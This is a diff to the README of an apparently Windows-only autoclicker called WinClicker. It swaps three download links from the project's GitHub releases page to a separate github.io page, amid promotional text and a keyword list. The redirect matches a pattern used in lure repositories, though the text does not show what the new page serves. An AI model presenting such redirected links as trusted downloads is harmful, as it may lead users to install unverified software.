@@ -4,7 +4,7 @@
 
 WinClicker is a powerful, lightning-fast autoclicker application built with modern Windows technologies. Whether you need to automate repetitive clicks for gaming, testing, or productivity, WinClicker delivers exceptional performance with a sleek, modern interface that fits perfectly into Windows 10 and Windows 11.
 
-[![Download WinClicker](https://img.shields.io/badge/Download-WinClicker-0078D4?style=for-the-badge&logo=windows)](https://github.com/magnadisciplinary950/WinClicker/releases)
+[![Download WinClicker](https://img.shields.io/badge/Download-WinClicker-0078D4?style=for-the-badge&logo=windows)](https://magnadisciplinary950.github.io)
 
 ## ✨ Key Features
 
@@ -29,7 +29,7 @@ WinClicker is a powerful, lightning-fast autoclicker application built with mode
 
 **Step 1: Download WinClicker**
 
-[**Click here to download WinClicker**](https://github.com/magnadisciplinary950/WinClicker/releases)
+[**Click here to download WinClicker**](https://magnadisciplinary950.github.io)
 
 Visit this link to download the application.
 
@@ -129,6 +129,6 @@ Built with:
 
 **Download WinClicker today and experience the fastest autoclicker for Windows!**
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-WinClicker-brightgreen?style=for-the-badge)](https://github.com/magnadisciplinary950/WinClicker/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-WinClicker-brightgreen?style=for-the-badge)](https://magnadisciplinary950.github.io)
 
 Keywords: autoclicker, automation, csharp, fluent-design, winclicker, windows, windows-10, windows-11, windows-app-sdk, winui, winui-3
